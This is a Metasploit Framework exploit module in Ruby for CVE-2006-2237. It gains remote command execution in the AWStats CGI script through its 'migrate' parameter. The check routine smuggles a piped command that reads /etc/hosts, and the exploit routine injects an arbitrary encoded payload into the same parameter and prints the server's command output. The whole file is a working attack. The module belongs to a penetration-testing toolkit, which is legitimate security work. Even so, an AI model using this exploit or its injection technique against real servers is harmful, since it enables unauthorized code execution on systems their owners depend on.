##
# $Id: awstats_migrate_exec.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AWStats migrate Remote Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in the
				AWStats CGI script. AWStats v6.4 and v6.5 are vulnerable. Perl based
				payloads are recommended with this module. The vulnerability is only
				present when AllowToUpdateStatsFromBrowser is enabled in the AWstats
				configuration file (non-default).
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					['CVE', '2006-2237'],
					['OSVDB', '25284'],
					['BID', '17844'],
					['URL', 'http://awstats.sourceforge.net/awstats_security_news.php'],
					['URL', 'http://www.milw0rm.com/exploits/1755'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 512,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'May 04 2006',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to awstats.pl", "/cgi-bin/awstats.pl"]),
				OptString.new('AWSITE', [true, "The AWStats config site name", "demo"]),
			], self.class)
	end

	def check
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' =>
				{
					'migrate' => "|echo;cat /etc/hosts;echo|awstats#{Rex::Text.rand_text_numeric(6)}.#{datastore['AWSITE']}.txt"
				}
			}, 25)

		if (res and res.body.match(/localhost/))
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		command = Rex::Text.uri_encode("cd /tmp &&" + payload.encoded)
		sploit = datastore['URI'] + "?migrate=|echo;echo%20YYY;#{command};echo%20YYY;echo|awstats#{Rex::Text.rand_text_numeric(6)}.#{datastore['AWSITE']}.txt"

		res = send_request_raw({
			'uri'     => sploit,
			'method'  => 'GET',
			'headers' =>
				{
					'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
					'Connection' => 'Close',
				}
			}, 25)

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")

			m = res.body.match(/YYY\n(.*)\nYYY/m)

			if (m)
				print_status("Command output from the server:")
				print("\n" + m[1] + "\n\n")
			else
				print_status("This server may not be vulnerable")
			end
		else
			print_status("No response from the server")
		end
	end

end
